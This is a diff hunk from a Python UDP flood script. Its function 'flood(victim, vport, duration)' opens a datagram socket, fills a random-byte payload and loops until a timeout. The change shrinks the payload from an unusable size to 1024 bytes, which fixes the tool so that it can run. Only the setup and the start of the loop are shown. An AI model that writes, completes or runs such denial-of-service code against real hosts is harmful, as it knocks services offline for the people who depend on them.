@@ -10,9 +10,9 @@ def usage():
 
 def flood(victim, vport, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes = random._urandom(999999999999)
+    bytes = random._urandom(1024)
     timeout =  time.time() + duration
-    sent = 0
+    sent = 1
 
     while 1:
         if time.time() > timeout:
